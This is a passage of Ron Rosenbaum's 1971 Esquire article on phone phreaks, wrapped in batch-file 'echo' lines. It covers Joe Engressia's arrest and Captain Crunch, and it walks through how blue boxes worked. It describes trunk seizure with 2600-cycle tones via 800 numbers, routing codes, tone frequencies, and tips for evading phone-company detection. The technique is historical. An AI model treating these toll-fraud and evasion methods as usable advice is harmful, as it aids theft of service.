echo The Big Memphis Bust
echo Joe Engressia never wanted to screw Ma Bell. His dream had always been to work for her.
echo The day I visited Joe in his small apartment on Union Avenue in Memphis, he w as upset about another setback in his application for a telephone 
echo job.
echo "They're stalling on it. I got a letter today telling me they'd have to postpone the interview I requested again. My landlord read it for me. They 
echo gave me some runaround about wanting papers on my rehabilitation status but I think there's something else going on."
echo When I switched on the 40-watt bulb in Joe's room -- he sometimes forgets when he has guests -- it looked as if there was enough telephone 
echo hardware to start a small phone company of his own.
echo There is one phone on top of his desk, one phone sitting in an open drawer beneath the desk top. Next to the desk-top phone is a cigar-boxsize M-F device with big toggle switches, and next to that is some kind of switching and coupling device with jacks and alligator plugs hanging 
echo loose. Next to that is a Braille typewriter. On the floor next to the desk, lying upside down like a dead tortoise, is the half-gutted body of an old 
echo black standard phone. Across the room on a torn and dusty couch are two more phones, one of them a touch-tone model; two tape recorders; 
echo a heap of phone patches and cassettes, and a life-size toy telephone.
echo Our conversation is interrupted every ten minutes by phone phreaks from all over the country ringing Joe on just about every piece of 
echo equipment but the toy phone and the Braille typewriter. One fourteen-year-old blind kid from Connecticut calls up and tells Joe he's got a girl 
echo friend. He wants to talk to Joe about girl friends. Joe says they'll talk later in the evening when they can be alone on the line. Joe draws a deep 
echo breath, whistles him off the air with an earsplitting 2600-cycle whistle. Joe is pleased to get the calls but he looked worried and preoccupied 
echo that evening, his brow constantly furrowed over his dark wandering eyes. In addition to the phone-company stall, he has just learned that his 
echo apartment house is due to be demolished in sixty days for urban renewal. For all its shabbiness, the Union Avenue apartment house has been 
echo Joe's first home-of-his-ow n and he's worried that he may not find another before this one is demolished.
echo But what really bothers Joe is that switchmen haven't been listening to him. "I've been doing some checking on 800 numbers lately, and I've 
echo discovered that certain 800 numbers in New Hampshire couldn't be reached from Missouri and Kansas. Now it may sound like a small thing, but 
echo I don't like to see sloppy work; it makes me feel bad about the lines. So I've been calling up switching offices and reporting it, but they haven't 
echo corrected it. I called them up for the third time today and instead of checking they just got mad. Well, that gets me mad. I mean, I do try to help 
echo them. There's something about them I can't understand -- you want to help them and they just try to say you're defrauding them."
echo It is Sunday evening and Joe invites me to join him for dinner at a Holiday Inn. Frequently on Sunday evening Joe takes some of his welfare 
echo money, calls a cab, and treats himself to a steak dinner at one of Memphis' thirteen Holiday Inns. (Memphis is the headquarters of Holiday Inn. 
echo Holiday Inns have been a favorite for Joe ever since he made his first solo phone trip to a Bell switching office in Jacksonville, Florida, and 
echo stayed in the Holiday Inn there. He likes to stay at Holiday Inns, he explains, because they represent freedom to him and because the rooms are 
echo arranged the same all over the country so he knows that any Holiday Inn room is familiar territory to him. Just like any telephone.)
echo Over steaks in the Pinnacle Restaurant of the Holiday Inn Medical Center on Madison Avenue in Memphis, Joe tells me the highlights of his life 
echo as a phone phreak.
echo At age seven, Joe learned his first phone trick. A mean baby -sitter, tired of listening to little Joe play with the phone as he always did, 
echo constantly, put a lock on the phone dial. "I got so mad. When there's a phone sitting there and I can't use it... so I started getting mad and 
echo banging the receiver up and down. I noticed I banged it once and it dialed one. Well, then I tried banging it twice...." In a few minutes Joe 
echo learned how to dial by pressing the hook switch at the right time. "I was so excited I remember going 'whoo whoo' and beat a box down on 
echo the floor."
echo At age eight Joe learned about whistling. "I was listening to some intercept non working-number recording in L.A.- I was calling L.A. as far 
echo back as that, but I'd mainly dial non working numbers because there was no charge, and I'd listen to these recordings all day. Well, I was 
echo whistling 'cause listening to these recordings can be boring after a while even if they are from L.A., and all of a sudden, in the middle of 
echo whistling, the recording clicked off. I fiddled around whistling some more, and the same thing happened. So I called up the switch room and 
echo said, 'I'm Joe. I'm eight years old and I want to know why when I whistle this tune the line clicks off.' He tried to explain it to me, but it was a little 
echo too technical at the time. I went on learning. That was a thing nobody was going to stop me from doing. The phones were my life, and I was 
echo going to pay any price to keep on learning. I knew I could go to jail. But I had to do what I had to do to keep on learning."
echo The phone is ringing when we walk back into Joe's apartment on Union Avenue. It is Captain Crunch. The Captain has been following me 
echo around by phone, calling up everywhere I go with additional bits of advice and explanation for me and whatever phone phreak I happen to be 
echo visiting. This time the Captain reports he is calling from what he describes as "my hideaway high up in the Sierra Nevada." He pulses out lusty 
echo salvos of M-F and tells Joe he is about to "go out and get a little action tonight. Do some phreaking of another kind, if you know what I mean." 
echo Joe chuckles.
echo The Captain then tells me to make sure I understand that what he told me about tying up the nation's phone lines was true, but that he and the 
echo phone phreaks he knew never used the technique for sabotage. They only learned the technique to help the phone company.
echo "We do a lot of troubleshooting for them. Like this New Hampshire/Missouri WATS-line flaw I've been screaming about. We help them more than 
echo they know."
echo After we say good-bye to the Captain and Joe whistles him off the line, Joe tells me about a disturbing dream he had the night before: "I had 
echo been caught and they were taking me to a prison. It was a long trip. They were taking me to a prison a long long way away. And we stopped 
echo at a Holiday Inn and it was my last night ever using the phone and I was crying and crying, and the lady at the Holiday Inn said, 'Gosh, honey, 
echo you should never be sad at a Holiday Inn. You should always be happy here. Especially since it's your last night.' And that just made it worse 
echo and I was sobbing so much I couldn't stand it."
echo Two weeks after I left Joe Engressia's apartment, phone-company security agents and Memphis police broke into it. Armed with a warrant, 
echo which they left pinned to a wall, they confiscated every piece of equipment in the room, including his toy telephone. Joe was placed under 
echo arrest and taken to the city jail where he was forced to spend the night since he had no money and knew no one in Memphis to call.
echo It is not clear who told Joe what that night, but someone told him that the phone company had an open-and-shut case against him because of 
echo revelations of illegal activity he had made to a phone-company undercover agent.
echo By morning Joe had become convinced that the reporter from Esquire, with whom he had spoken two weeks ago, was the undercover agent. 
echo He probably had ugly thoughts about someone he couldn't see gaining his confidence, listening to him talk about his personal obsessions and 
echo dreams, while planning all the while to lock him up.
echo "I really thought he was a reporter," Engressia told the Memphis Press-Seminar. "I told him everything...." Feeling betrayed, Joe proceeded to 
echo confess everything to the press and police.
echo As it turns out, the phone company did use an undercover agent to trap Joe, although it was not the Esquire reporter.
echo Ironically, security agents were alerted and began to compile a case against Joe because of one of his acts of love for the system: Joe had 
echo called an internal service department to report that he had located a group of defective long-distance trunks, and to complain again about the 
echo New Hampshire/Missouri WATS problem. Joe always liked Ma Bell's lines to be clean and responsive. A suspicious switchman reported Joe to 
echo the security agents who discovered that Joe had never had a long-distance call charged to his name.
echo Then the security agents learned that Joe was planning one of his phone trips to a local switching office. The security people planted one of 
echo their agents in the switching office. He posed as a student switchman and followed Joe around on a tour. He was extremely friendly and 
echo helpful to Joe, leading him around the office by the arm. When the tour was over he offered Joe a ride back to his apartment house. On the 
echo way he asked Joe -- one tech man to another -- about "those blue boxers" he'd heard about. Joe talked about them freely, talked about his blue 
echo box freely, and about all the other things he could do with the phones.
echo The next day the phone-company security agents slapped a monitoring tape on Joe's line, which eventually picked up an illegal call. Then they 
echo applied for the search warrant and broke in.
echo In court Joe pleaded not guilty to possession of a blue box and theft of service. A sympathetic judge reduced the charges to malicious mischief 
echo and found him guilty on that count, sentenced him to two thirty-day sentences to be served concurrently and then suspended the sentence on 
echo condition that Joe promise never to play with phones again. Joe promised, but the phone company refused to restore his service. For two 
echo weeks after the trial Joe could not be reached except through the pay phone at his apartment house, and the landlord screened all calls for 
echo him.
echo Phone-phreak Carl managed to get through to Joe after the trial, and reported that Joe sounded crushed by the whole affair.
echo "What I'm worried about," Carl told me, "is that Joe means it this time. The promise. That he'll never phone-phreak again. That's what he told me, 
echo that he's given up phone-phreaking for good. I mean his entire life. He says he knows they're going to be watching him so closely for the rest 
echo of his life he'll never be able to make a move without going straight to jail. He sounded very broken up by the whole experience of being in jail. It 
echo was awful to hear him talk that way. I don't know. I hope maybe he had to sound that way. Over the phone, you know."
echo He reports that the entire phone-phreak underground is up in arms over the phone company's treatment of Joe. "All the while Joe had his 
echo hopes pinned on his application for a phone-company job, they were stringing him along getting ready to bust him. That gets me mad. Joe spent 
echo most of his time helping them out. The bastards. They think they can use him as an example. All of sudden they're harassing us on the coast. 
echo Agents are jumping up on our lines. They just busted ------'s mute yesterday and ripped out his lines. But no matter what Joe does, I don't think 
echo we're going to take this lying down."
echo Two weeks later my phone rings and about eight phone phreaks in succession say hello from about eight different places in the country, 
echo among them Carl, Ed, and Captain Crunch. A nationwide phone-phreak conference line has been reestablished through a switching machine in 
echo --------, with the cooperation of a disgruntled switchman.
echo "We have a special guest with us today," Carl tells me.
echo The next voice I hear is Joe's. He reports happily that he has just moved to a place called Millington, Tennessee, fifteen miles outside of 
echo Memphis, where he has been hired as a telephone-set repairman by a small independent phone company. Someday he hopes to be an 
echo equipment troubleshooter.
echo "It's the kind of job I dreamed about. They found out about me from the publicity surrounding the trial. Maybe Ma Bell did me a favor busting me. 
echo I'll have telephones in my hands all day long."
echo "You know the expression, 'Don't get mad, get even'?" phone-phreak Carl asked me. "Well, I think they're going to be very sorry about what 
echo they did to Joe and what they're trying to do to us."

echo 150. "Secrets of the Little Blue Box" by Ron Rosenbaum
echo Dudes... These four files contain the story, "Secrets of the Little Blue Box".
echo -A story so incredible it may even make you feel sorry for the phone companyPrinted in the October 1971 issue of Esquire Magazine. If you happen to be in a library and come across a collection of Esquire magazines, the 
echo October 1971 issue is the first issue printed in the smaller format. The story begins on page 116 with a picture of a blue box.
echo --One Farad Cap, Atlantic Anarchist Guild
echo The Blue Box Is Introduced: Its Qualities Are Remarked I am in the expensively furnished living room of Al Gilbertson (His real name has been 
echo changed.), the creator of the "blue box." Gilbertson is holding one of his shiny black-and-silver "blue boxes" comfortably in the palm of his 
echo hand, pointing out the thirteen little red push buttons sticking up from the console. He is dancing his fingers over the buttons, tapping out 
echo discordant beeping electronic jingles. He is trying to explain to me how his little blue box does nothing less than place the entire telephone 
echo system of the world, satellites, cables and all, at the service of the blue-box operator, free of charge.
echo "That's what it does. Essentially it gives you the power of a super operator. You seize a tandem with this top button," he presses the top 
echo button with his index finger and the blue box emits a high-pitched cheep, "and like that" -- cheep goes the blue box again -- "you control the 
echo phone company's long-distance switching systems from your cute little Princes phone or any old pay phone. And you've got anonymity. An 
echo operator has to operate from a definite location: the phone company knows where she is and what she's doing. But with your beeper box, 
echo once you hop onto a trunk, say from a Holiday Inn 800 (toll-free) number, they don't know where you are, or where you're coming from, they 
echo don't know how you slipped into their lines and popped up in that 800 number. They don't even know anything illegal is going on. And you can 
echo obscure your origins through as many levels as you like. You can call next door by way of White Plains, then over to Liverpool by cable, and 
echo then back here by satellite. You can call yourself from one pay phone all the way around the world to a pay phone next to you. And you get 
echo your dime back too."
echo "And they can't trace the calls? They can't charge you?" "Not if you do it the right way. But you'll find that the free-call thing isn't really as 
echo exciting at first as the feeling of power you get from having one of these babies in your hand. I've watched people when they first get hold of 
echo one of these things and start using it, and discover they can make connections, set up crisscross and zigzag switching patterns back and 
echo forth across the world. They hardly talk to the people they finally reach. They say hello and start thinking of what kind of call to make next. 
echo They go a little crazy." He looks down at the neat little package in his palm. His fingers are still dancing, tapping out beeper patterns.
echo "I think it's something to do with how small my models are. There are lots of blue boxes around, but mine are the smallest and most 
echo sophisticated electronically. I wish I could show you the prototype we made for our big syndicate order."
echo He sighs. "We had this order for a thousand beeper boxes from a syndicate front man in Las Vegas. They use them to place bets coast to 
echo coast, keep lines open for hours, all of which can get expensive if you have to pay. The deal was a thousand blue boxes for $300 apiece. 
echo Before then we retailed them for $1500 apiece, but $300,000 in one lump was hard to turn down. We had a manufacturing deal worked out in 
echo the Philippines. Everything ready to go. Anyway, the model I had ready for limited mass production was small enough to fit inside a flip-top 
echo Marlboro box. It had flush touch panels for a keyboard, rather than these unsightly buttons, sticking out. Looked just like a tiny portable radio. In 
echo fact, I had designed it with a tiny transistor receiver to get one AM channel, so in case the law became suspicious the owner could switch on 
echo the radio part, start snapping his fingers, and no one could tell anything illegal was going on. I thought of everything for this model -- I had it 
echo lined with a band of thermite which could be ignited by radio signal from a tiny button transmitter on your belt, so it could be burned to ashes 
echo instantly in case of a bust. It was beautiful. A beautiful little machine. You should’ve seen the faces on these syndicate guys when they came 
echo back after trying it out. They'd hold it in their palm like they never wanted to let it go, and they'd say, 'I can't believe it. I can't believe it.' You 
echo probably won't believe it until you try it."
echo The Blue Box Is Tested: Certain Connections Are Made
echo About eleven o'clock two nights later Fraser Lucey has a blue box in the palm of his left hand and a phone in the palm of his right. He is 
echo standing inside a phone booth next to an isolated shut-down motel off Highway 1. I am standing outside the phone booth.
echo Fraser likes to show off his blue box for people. Until a few weeks ago when Pacific Telephone made a few arrests in his city, Fraser Lucey 
echo liked to bring his blue box (This particular blue box, like most blue boxes, is not blue. Blue boxes have come to be called "blue boxes" either
echo because 1) The first blue box ever confiscated by phone-company security men happened to be blue, or 2) To distinguish them from "black 
echo boxes." Black boxes are devices, usually a resistor in series, which, when attached to home phones, allow all incoming calls to be made 
echo without charge to one's caller.) to parties. It never failed: A few cheeps from his device and Fraser became the center of attention at the very 
echo hippest of gatherings, playing phone tricks and doing request numbers for hours. He began to take orders for his manufacturer in Mexico. He 
echo became a dealer.
echo Fraser is cautious now about where he shows off his blue box. But he never gets tired of playing with it. "It's like the first time every time," he 
echo tells me.
echo Fraser puts a dime in the slot. He listens for a tone and holds the receiver up to my ear. I hear the tone. Fraser begins describing, with a certain 
echo practiced air, what he does while he does it. "I'm dialing an 800 number now. Any 800 number will do. It's toll free. Tonight I think I'll use the ----
echo - (he names a well-know rent-a-car company) 800 number. Listen, It's ringing. Here, you hear it? Now watch." He places the blue box over the 
echo mouthpiece of the phone so that the one silver and twelve black push buttons are facing up toward me. He presses the silver button -- the one 
echo at the top -- and I hear that high-pitched beep. "That's 2600 cycles per second to be exact," says Lucey. "Now, quick. Listen." He shoves the 
echo earpiece at me. The ringing has vanished. The line gives a slight hiccough, there is a sharp buzz, and then nothing but soft white noise.
echo "We're home free now," Lucey tells me, taking back the phone and applying the blue box to its mouthpiece once again. "We're up on a tandem, 
echo into a long-lines trunk. Once you're up on a tandem, you can send yourself anywhere you want to go." He decides to check out London first. 
echo He chooses a certain pay phone located in Waterloo Station. This particular pay phone is popular with the phone-phreaks network because 
echo there are usually people walking by at all hours who will pick it up and talk for a while.
echo He presses the lower left-hand corner button which is marked "KP" on the face of the box. "That's Key Pulse. It tells the tandem we're ready to 
echo give it instructions. First I'll punch out KP 182 START, which will slide us into the overseas sender in White Plains." I hear a neat clunk-cheep. "I 
echo think we'll head over to England by satellite. Cable is actually faster and the connection is somewhat better, but I like going by satellite. So I just 
echo punch out KP Zero 44. The Zero is supposed to guarantee a satellite connection and 44 is the country code for England. Okay... we're there. In 
echo Liverpool actually. Now all I have to do is punch out the London area code which is 1, and dial up the pay phone. Here, listen, I've got a ring 
echo now."
echo I hear the soft quick purr-purr of a London ring. Then someone picks up the phone.
echo "Hello," says the London voice.
echo "Hello. Who's this?" Fraser asks.
echo "Hello. There's actually nobody here. I just picked this up while I was passing by. This is a public phone. There's no one here to answer 
echo actually."
echo "Hello. Don't hang up. I'm calling from the United States."
echo "Oh. What is the purpose of the call? This is a public phone you know."
echo "Oh. You know. To check out, uh, to find out what's going on in London. How is it there?"
echo "Its five o'clock in the morning. It's raining now."
echo "Oh. Who are you?"
echo The London passerby turns out to be an R.A.F. enlistee on his way back to the base in Lincolnshire, with a terrible hangover after a thirty-sixhour pass. He and Fraser talk about the rain. They agree that it's nicer when it's not raining. They say good-bye and Fraser hangs up. His dime 
echo returns with a nice clink.
echo "Isn't that far out," he says grinning at me. "London, like that."
echo Fraser squeezes the little blue box affectionately in his palm. "I told ya this thing is for real. Listen, if you don't mind I'm gonna try this girl I know 
echo in Paris. I usually give her a call around this time. It freaks her out. This time I'll use the ------ (a different rent-a-car company) 800 number and 
echo we'll go by overseas cable, 133; 33 is the country code for France, the 1 sends you by cable. Okay, here we go.... Oh damn. Busy. Who could 
echo she be talking to at this time?"
echo A state police car cruises slowly by the motel. The car does not stop, but Fraser gets nervous. We hop back into his car and drive ten miles in 
echo the opposite direction until we reach a Texaco station locked up for the night. We pull up to a phone booth by the tire pump. Fraser dashes 
echo inside and tries the Paris number. It is busy again.
echo "I don't understand who she could be talking to. The circuits may be busy. It's too bad I haven't learned how to tap into lines overseas with this 
echo thing yet."
echo Fraser begins to phreak around, as the phone phreaks say. He dials a leading nationwide charge card's 800 number and punches out the 
echo tones that bring him the time recording in Sydney, Australia. He beeps up the weather recording in Rome, in Italian of course. He calls a friend 
echo in Boston and talks about a certain over-the-counter stock they are into heavily. He finds the Paris number busy again. He calls up "Dial a Disc" 
echo in London, and we listen to Double Barrel by David and Ansil Collins, the number-one hit of the week in London. He calls up a dealer of another 
echo sort and talks in code. He calls up Joe Engressia, the original blind phone-phreak genius, and pays his respects. There are other calls. Finally 
echo Fraser gets through to his young lady in Paris.
echo They both agree the circuits must have been busy, and criticize the Paris telephone system. At two-thirty in the morning Fraser hangs up, 
echo pockets his dime, and drives off, steering with one hand, holding what he calls his "lovely little blue box" in the other.
echo You Can Call Long Distance For Less Than You Think
echo "You see, a few years ago the phone company made one big mistake," Gilbertson explains two days later in his apartment. "They were 
echo careless enough to let some technical journal publish the actual frequencies used to create all their multi-frequency tones. Just a theoretical 
echo article some Bell Telephone Laboratories engineer was doing about switching theory, and he listed the tones in passing. At ----- (a wellknown technical school) I had been fooling around with phones for several years before I came across a copy of the journal in the engineering 
echo library. I ran back to the lab and it took maybe twelve hours from the time I saw that article to put together the first working blue box. It was 
echo bigger and clumsier than this little baby, but it worked."
echo It's all there on public record in that technical journal written mainly by Bell Lab people for other telephone engineers. Or at least it was public. 
echo "Just try and get a copy of that issue at some engineering-school library now.
echo Bell has had them all red-tagged and withdrawn from circulation," Gilbertson tells me.
echo "But it's too late. It's all public now. And once they became public the technology needed to create your own beeper device is within the range 
echo of any twelve-year-old kid, any twelve-year-old blind kid as a matter of fact. And he can do it in less than the twelve hours it took us. Blind kids 
echo do it all the time. They can't build anything as precise and compact as my beeper box, but theirs can do anything mine can do."
echo "How?"
echo "Okay. About twenty years ago ATandT. made a multi-billion-dollar decision to operate its entire long-distance switching system on twelve 
echo electronically generated combinations of twelve master tones. Those are the tones you sometimes hear in the background after you've dialed a 
echo long-distance number. They decided to use some very simple tones -- the tone for each number is just two fixed single-frequency tones 
echo played simultaneously to create a certain beat frequency. Like 1300 cycles per second and 900 cycles per second played together give you 
echo the tone for digit 5. Now, what some of these phone phreaks have done is get themselves access to an electric organ. Any cheap family 
echo home-entertainment organ. Since the frequencies are public knowledge now -- one blind phone phreak has even had them recorded in one of 
echo the talking books for the blind -- they just have to find the musical notes on the organ which correspond to the phone tones. Then they tape 
echo them. For instance, to get Ma Bell's tone for the number 1, you press down organ keys F~5 and A~5 (900 and 700 cycles per second) at the 
echo same time. To produce the tone for 2 it's F~5 and C~6 (1100 and 700 cps). The phone phreaks circulate the whole list of notes so there's no 
echo trial and error anymore."
echo He shows me a list of the rest of the phone numbers and the two electric organ keys that produce them.
echo "Actually, you have to record these notes at 3 3/4 inches -per-second tape speed and double it to 7 « inches-per-second when you play them 
echo back, to get the proper tones," he adds.
echo "So once you have all the tones recorded, how do you plug them into the phone system?"
echo "Well, they take their organ and their cassette recorder, and start banging out entire phone numbers in tones on the organ, including country 
echo codes, routing instructions, 'KP' and 'Start' tones. Or, if they don't have an organ, someone in the phone-phreak network sends them a 
echo cassette with all the tones recorded, with a voice saying 'Number one,' then you have the tone, 'Number two,' then the tone and so on. So with 
echo two cassette recorders they can put together a series of phone numbers by switching back and forth from number to number. Any idiot in the 
echo country with a cheap cassette recorder can make all the free calls he wants."
echo "You mean you just hold the cassette recorder up the mouthpiece and switch in a series of beeps you've recorded? The phone thinks that 
echo anything that makes these tones must be its own equipment?"
echo "Right. As long as you get the frequency within thirty cycles per second of the phone company's tones, the phone equipment thinks it hears its 
echo own voice talking to it. The original granddaddy phone phreak was this blind kid with perfect pitch, Joe Engressia, who used to whistle into the 
echo phone. An operator could tell the difference between his whistle and the phone company's electronic tone generator, but the phone company's 
echo switching circuit can't tell them apart. The bigger the phone company gets and the further away from human operators it gets, the more 
echo vulnerable it becomes to all sorts of phone phreaking."
echo A Guide for the Perplexed
echo "But wait a minute," I stop Gilbertson. "If everything you do sounds like phone-company equipment, why doesn't the phone company charge 
echo you for the call the way it charges its own equipment?"
echo "Okay. That's where the 2600-cycle tone comes in. I better start from the beginning."
echo The beginning he describes for me is a vision of the phone system of the continent as thousands of webs, of long-line trunks radiating from 
echo each of the hundreds of toll switching offices to the other toll switching offices. Each toll switching office is a hive compacted of thousands of 
echo long-distance tandems constantly whistling and beeping to tandems in far-off toll switching offices.
echo The tandem is the key to the whole system. Each tandem is a line with some relays with the capability of signaling any other tandem in any 
echo other toll switching office on the continent, either directly one-to-one or by programming a roundabout route through several other tandems if all 
echo the direct routes are busy. For instance, if you want to call from New York to Los Angeles and traffic is heavy on all direct trunks between the 
echo two cities, your tandem in New York is programmed to try the next best route, which may send you down to a tandem in New Orleans, then up 
echo to San Francisco, or down to a New Orleans tandem, back to an Atlanta tandem, over to an Albuquerque tandem and finally up to Los Angeles.
echo When a tandem is not being used, when it's sitting there waiting for someone to make a long-distance call, it whistles. One side of the tandem, 
echo the side "facing" your home phone, whistles at 2600 cycles per second toward all the home phones serviced by the exchange, telling them it is 
echo at their service, should they be interested in making a long-distance call. The other side of the tandem is whistling 2600 cps. into one or more 
echo long-distance trunk lines, telling the rest of the phone system that it is neither sending nor receiving a call through that trunk at the moment, that 
echo it has no use for that trunk at the moment.
echo "When you dial a long-distance number the first thing that happens is that you are hooked into a tandem. A register comes up to the side of the 
echo tandem facing away from you and presents that side with the number you dialed. This sending side of the tandem stops whistling 2600 into its 
echo trunk line. When a tandem stops the 2600 tone it has been sending through a trunk, the trunk is said to be "seized," and is now ready to carry 
echo the number you have dialed -- converted into multi-frequency beep tones -- to a tandem in the area code and central office you want.
echo Now when a blue-box operator wants to make a call from New Orleans to New York he starts by dialing the 800 number of a company which 
echo might happen to have its headquarters in Los Angeles. The sending side of the New Orleans tandem stops sending 2600 out over the trunk to 
echo the central office in Los Angeles, thereby seizing the trunk. Your New Orleans tandem begins sending beep tones to a tandem it has 
echo discovered idly whistling 2600 cycles in Los Angeles. The receiving end of that LA tandem is seized, stops whistling 2600, listens to the beep 
echo tones which tell it which LA phone to ring, and starts ringing the 800 number. Meanwhile a mark made in the New Orleans office accounting 
echo tape notes that a call from your New Orleans phone to the 800 number in LA has been initiated and gives the call a code number. Everything is 
echo routine so far.
echo But then the phone phreak presses his blue box to the mouthpiece and pushes the 2600-cycle button, sending 2600 out from the New Orleans 
echo tandem to the LA tandem. The LA tandem notices 2600 cycles are coming over the line again and assumes that New Orleans has hung up 
echo because the trunk is whistling as if idle. The LA tandem immediately ceases ringing the LA 800 number. But as soon as the phreak takes his
echo finger off the 2600 button, the LA tandem assumes the trunk is once again being used because the 2600 is gone, so it listens for a new series 
echo of digit tones - to find out where it must send the call.
echo Thus the blue-box operator in New Orleans now is in touch with a tandem in LA which is waiting like an obedient genie to be told what to do 
echo next. The blue-box owner then beeps out the ten digits of the New York number which tell the LA tandem to relay a call to New York City. 
echo Which it promptly does. As soon as your party picks up the phone in New York, the side of the New Orleans tandem facing you stops sending 
echo 2600 cycles to you and starts carrying his voice to you by way of the LA tandem. A notation is made on the accounting tape that the 
echo connection has been made on the 800 call which had been initiated and noted earlier. When you stop talking to New York a notation is made 
echo that the 800 call has ended.
echo At three the next morning, when the phone company's accounting computer starts reading back over the master accounting tape for the past 
echo day, it records that a call of a certain length of time was made from your New Orleans home to an LA 800 number and, of course, the 
echo accounting computer has been trained to ignore those toll-free 800 calls when compiling your monthly bill.
echo "All they can prove is that you made an 800 toll-free call," Gilbertson the inventor concludes. "Of course, if you're foolish enough to talk for two 
echo hours on an 800 call, and they've installed one of their special anti-fraud computer programs to watch out for such things, they may spot you 
echo and ask why you took two hours talking to Army Recruiting's 800 number when you're 4-F.
echo But if you do it from a pay phone, they may discover something peculiar the next day -- if they've got a blue-box hunting program in their 
echo computer -- but you'll be a long time gone from the pay phone by then. Using a pay phone is almost guaranteed safe."
echo "What about the recent series of blue-box arrests all across the country -- New York, Cleveland, and so on?" I asked. "How were they caught 
echo so easily?"
echo "From what I can tell, they made one big mistake: they were seizing trunks using an area code plus 555-1212 instead of an 800 number. Using 
echo 555 is easy to detect because when you send multi-frequency beep tones of 555 you get a charge for it on your tape and the accounting 
echo computer knows there's something wrong when it tries to bill you for a two-hour call to Akron, Ohio, information, and it drops a trouble card 
echo which goes right into the hands of the security agent if they're looking for blue-box user.
echo "Whoever sold those guys their blue boxes didn't tell them how to use them properly, which is fairly irresponsible. And they were fairly stupid 
echo to use them at home all the time.
echo "But what those arrests really mean is than an awful lot of blue boxes are flooding into the country and that people are finding them so easy to 
echo make that they know how to make them before they know how to use them. Ma Bell is in trouble."
echo And if a blue-box operator or a cassette-recorder phone phreak sticks to pay phones and 800 numbers, the phone company can't stop them?
echo "Not unless they change their entire nationwide long-lines technology, which will take them a few billion dollars and twenty years. Right now 
echo they can't do a thing. They're screwed."
echo Captain Crunch Demonstrates His Famous Unit
echo There is an underground telephone network in this country. Gilbertson discovered it the very day news of his activities hit the papers. That 
echo evening his phone began ringing. Phone phreaks from Seattle, from Florida, from New York, from San Jose, and from Los Angeles began 
echo calling him and telling him about the phone-phreak network. He'd get a call from a phone phreak who'd say nothing but, "Hang up and call this 
echo number."
echo When he dialed the number he'd find himself tied into a conference of a dozen phone phreaks arranged through a quirky switching station in 
echo British Columbia. They identified themselves as phone phreaks, they demonstrated their homemade blue boxes which they called "M-Fers" (for 
echo "multi-frequency," among other things) for him, they talked shop about phone-phreak devices. They let him in on their secrets on the theory that 
echo if the phone company was after him he must be trustworthy. And, Gilbertson recalls, they stunned him with their technical sophistication.
echo I ask him how to get in touch with the phone-phreak network. He digs around through a file of old schematics and comes up with about a 
echo dozen numbers in three widely separated area codes.
echo "Those are the centers," he tells me. Alongside some of the numbers he writes in first names or nicknames: names like Captain Crunch, Dr. No, 
echo Frank Carson (also a code word for a free call), Marty Freeman (code word for M-F device), Peter Perpendicular Pimple, Alefnull, and The 
echo Cheshire Cat. He makes checks alongside the names of those among these top twelve who are blind. There are five checks.
echo I ask him who this Captain Crunch person is.
echo "Oh. The Captain. He's probably the most legendary phone phreak. He calls himself Captain Crunch after the notorious Cap'n Crunch 2600 
echo whistle." (Several years ago, Gilbertson explains, the makers of Cap'n Crunch breakfast cereal offered a toy -whistle prize in every box as a 
echo treat for the Cap'n Crunch set. Somehow a phone phreak discovered that the toy whistle just happened to produce a perfect 2600-cycle tone. 
echo When the man who calls himself Captain Crunch was transferred overseas to England with his Air Force unit, he would receive scores of 
echo calls from his friends and "mute" them -- make them free of charge to them -- by blowing his Cap'n Crunch whistle into his end.) "Captain 
echo Crunch is one of the older phone phreaks," Gilbertson tells me. "He's an engineer who once got in a little trouble for fooling around with the 
echo phone, but he can't stop. Well, the guy drives across country in a Volkswagen van with an entire switchboard and a computerized supersophisticated M-F-er in the back. He'll pull up to a phone booth on a lonely highway somewhere, snake a cable out of his bus, hook it onto the 
echo phone and sit for hours, days sometimes, sending calls zipping back and forth across the country, all over the world...."
echo Back at my motel, I dialed the number he gave me for "Captain Crunch" and asked for G---- T-----, his real name, or at least the name he uses 
echo when he's not dashing into a phone booth beeping out M-F tones faster than a speeding bullet and zipping phantomlike through the phone 
echo company's long-distance lines.
echo When G---- T----- answered the phone and I told him I was preparing a story for Esquire about phone phreaks, he became very indignant.
echo "I don't do that. I don't do that anymore at all. And if I do it, I do it for one reason and one reason only. I'm learning about a system. The phone 
echo company is a System. A computer is a System, do you understand? If I do what I do, it is only to explore a system. Computers, systems, that's 
echo my bag. The phone company is nothing but a computer."
echo A tone of tightly restrained excitement enters the Captain's voice when he starts talking about systems. He begins to pronounce each syllable 
echo w ith the hushed deliberation of an obscene caller.
echo "Ma Bell is a system I want to explore. It's a beautiful system, you know, but Ma Bell screwed up. It's terrible because Ma Bell is such a 
echo beautiful system, but she screwed up. I learned how she screwed up from a couple of blind kids who wanted me to build a device. A certain 
echo device. They said it could make free calls. I wasn't interested in free calls. But when these blind kids told me I could make calls into a computer, 
echo my eyes lit up. I wanted to learn about computers. I wanted to learn about Ma Bell's computers. So I build the little device, but I built it wrong and 
echo Ma Bell found out. Ma Bell can detect things like that. Ma Bell knows. So I'm strictly rid of it now. I don't do it. Except for learning purposes." He 
echo pauses. "So you want to write an article. Are you paying for this call? Hang up and call this number." He gives me a number in a area code a 
echo thousand miles away of his own. I dial the number.
echo "Hello again. This is Captain Crunch. You are speaking to me on a toll-free loop-around in Portland, Oregon. Do you know what a toll-free loop 
echo around is? I'll tell you."
echo He explains to me that almost every exchange in the country has open test numbers which allow other exchanges to test their connections 
echo with it. Most of these numbers occur in consecutive pairs, such as 302 956-0041 and 302 956-0042. Well, certain phone phreaks discovered 
echo that if two people from anywhere in the country dial the two consecutive numbers they can talk together just as if one had called the other's 
echo number, with no charge to either of them, of course.
echo "Now our voice is looping around in a 4A switching machine up there in Canada, zipping back down to me," the Captain tells me. "My voice is 
echo looping around up there and back down to you. And it can't ever cost anyone money. The phone phreaks and I have compiled a list of many of 
echo these numbers. You would be surprised if you saw the list. I could show it to you. But I won't. I'm out of that now. I'm not out to screw Ma Bell. 
echo I know better. If I do anything it's for the pure knowledge of the System. You can learn to do fantastic things. Have you ever heard eight 
echo tandems stacked up? Do you know the sound of tandems stacking and unstacking? Give me your phone number. Okay. Hang up now and wait 
echo a minute."
echo Slightly less than a minute later the phone rang and the Captain was on the line, his voice sounding far more excited, almost aroused.
echo "I wanted to show you what it's like to stack up tandems. To stack up tandems." (Whenever the Captain says "stack up" it sounds as if he is 
echo licking his lips.)
echo "How do you like the connection you're on now?" the Captain asks me. "It's a raw tandem. A raw tandem. Ain't nothing' up to it but a tandem. 
